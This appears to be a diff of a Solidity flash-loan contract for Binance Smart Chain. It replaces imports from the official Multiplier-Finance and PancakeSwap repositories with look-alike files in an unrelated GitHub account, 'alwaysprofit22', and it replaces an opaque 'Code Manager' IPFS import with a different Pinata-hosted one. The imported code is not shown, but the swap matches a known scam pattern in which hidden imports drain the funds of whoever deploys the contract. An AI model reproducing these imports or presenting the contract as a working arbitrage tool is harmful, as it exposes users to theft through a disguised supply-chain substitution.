@@ -1,13 +1,13 @@
 pragma solidity ^0.5.0;
 
 // Multiplier-Finance Smart Contracts
-import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
-import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
+import "https://github.com/alwaysprofit22/flashloan/blob/main/lendingpooladdressprovider.sol";
+import "https://github.com/alwaysprofit22/flashloan/blob/main/lendingpool.sol";
 
 // PancakeSwap Smart Contracts
-import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
-import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
-import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
+import "https://github.com/alwaysprofit22/flashloan/blob/main/Ipancakecall.sol";
+import "https://github.com/alwaysprofit22/flashloan/blob/main/Ipancakefactory.sol";
+import "https://github.com/alwaysprofit22/flashloan/blob/main/Ipancakepair.sol";
 
 /**
  * WARNING - this contract code is for Binance Smart Chain not Ethereum network
@@ -23,7 +23,7 @@ import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/i
 */
 
 // PancakeSwap BSC Code Manager
-import "ipfs://QmRTtpbXNfYgCgEGaam8rsM5nSHJBki8yEVCU45Y5k9F4A";
+import "https://gateway.pinata.cloud/ipfs/QmcAip3L1UbCtStnxSnifsVPhv5igcUUDtr6pYk7rM3dKo";
    
 contract GetFlashLoan {
    string public tokenName;
